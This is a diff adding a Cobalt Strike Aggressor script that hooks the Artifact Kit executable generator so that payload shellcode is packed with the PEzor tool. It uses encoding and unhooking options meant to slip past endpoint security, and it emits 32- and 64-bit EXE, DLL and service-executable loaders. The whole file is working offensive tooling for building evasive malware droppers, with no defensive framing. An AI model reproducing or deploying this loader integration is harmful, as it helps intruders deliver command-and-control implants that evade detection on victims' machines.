@@ -1,0 +1,53 @@
+include(script_resource("utils.cna"));
+include(script_resource("PEzor.cna"));
+
+# Artifact Kit Integration Script
+
+# Windows Executables and DLLs
+#
+# Arguments
+# 	$1 = artifact file (e.g., artifact32.exe)
+# 	$2 = shellcode
+# Return 
+#	our generated artifact
+set EXECUTABLE_ARTIFACT_GENERATOR {
+	local('$opts $format $payload $resource $tmpfile');
+
+	($resource, $payload) = @_;
+
+	$tmpfile = get_random_temp_filename();
+	write_file($tmpfile, $payload);
+	$opts = "-sgn -unhook";
+
+	#if (-hasbootstraphint $payload) {
+	#	throw "'smartinject = true' is not supported!";
+	#}
+
+	if ($resource eq "artifact32big.dll") {
+		$format = "-32 -format=dll";
+	} else if ($resource eq "artifact32.dll") {
+		$format = "-32 -format=dll";
+    } else if ($resource eq "artifact32big.exe") {
+		$format = "-32 -format=exe";
+	} else if ($resource eq "artifact32.exe") {
+		$format = "-32 -format=exe";
+	} else if ($resource eq "artifact32svcbig.exe") {
+		$format = "-32 -format=service-exe";
+	} else if ($resource eq "artifact32svc.exe") {
+		$format = "-32 -format=service-exe";
+	} else if ($resource eq "artifact64big.exe") {
+		$format = "-64 -format=exe";
+	} else if ($resource eq "artifact64big.x64.dll") {
+		$format = "-64 -format=dll";
+	} else if ($resource eq "artifact64.exe") {
+		$format = "-64 -format=exe";
+	} else if ($resource eq "artifact64svcbig.exe") {
+		$format = "-64 -format=service-exe";
+	} else if ($resource eq "artifact64svc.exe") {
+		$format = "-64 -format=service-exe";
+	} else if ($resource eq "artifact64.x64.dll") {
+		$format = "-64 -format=dll";
+	}
+
+	return read_file(execute_PEzor("$format $opts $tmpfile"));
+}
